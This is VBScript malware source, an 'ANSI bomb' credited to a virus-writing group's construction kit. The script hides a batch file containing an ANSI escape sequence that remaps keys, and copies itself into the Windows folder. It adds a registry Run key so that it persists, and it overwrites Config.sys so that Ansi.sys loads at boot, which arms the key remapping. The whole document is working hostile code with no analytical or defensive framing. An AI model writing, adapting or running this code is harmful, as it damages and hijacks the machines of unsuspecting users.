   On Error Resume Next
   'Ansi.VBS.EMM.BoomWin32
   'By PetiK
   'Made With Boom Win32 Ansi Bomb Kit 1.1K By -KD- [Metaphase VX Team & NoMercyVirusTeam]
   'For more info please read the Copyrite in the -About- Boom Win32 Ansi Bomb Kit.
   '-------- Do Not Edit Above This Line --------
   Dim EMMWSHShell, EMMFSO, MyEMM, EMMGetDrive
   Dim EMMTWinDir, EMMBat, EMMSysDir, EMMConfig
   Set EMMWSHShell = CreateObject("WScript.Shell")
   Set EMMFSO = CreateObject("Scripting.FileSystemObject")
   MyEMM = Wscript.ScriptFullName
   Set EMMTWinDir = EMMFSO.GetSpecialFolder(0)
   Set EMMBat = EMMFSO.CreateTextFile("EMM.bat", 2, False)
   EMMBat.WriteLine "@Echo On"
   EMMBat.WriteLine "[" & chr(34) & "y" & chr(34) & ";" & chr(34) & "n" & chr(34) & ";13p"
   EMMBat.WriteLine "Echo y| Copy %0 %WinDir%\WinStart.bat >Nul"
   EMMBat.Close
   EMMWSHShell.Run ("EMM.bat"), VbHide
   EMMFSO.DeleteFile ("EMM.bat")
   EMMFSO.CopyFile MyEMM, EMMTWinDir & Chr(92) & "MyEMM.vbs"
   EMMWSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Startup", EMMTWinDir & "\MyEMM.vbs"
   Set EMMSysDir = EMMFSO.GetSpecialFolder(1)
   EMMGetDrive = EMMFSO.GetDriveName(EMMSysDir)
   EMMFSO.CopyFile EMMSysDir & Chr(92) & "Ansi.sys", EMMGetDrive & Chr(92) & "Ansi.sys"
   EMMFSO.CopyFile EMMTWinDir & Chr(92) & "Command" & Chr(92) & "Ansi.sys", EMMGetDrive & Chr(92) & "Ansi.sys"
   Set EMMConfig = EMMFSO.CreateTextFile(EMMGetDrive & Chr(92) & "Config.sys", 2, False)
   EMMConfig.WriteLine EMMGetDrive & Chr(92) & "Ansi.sys"
   EMMConfig.Close
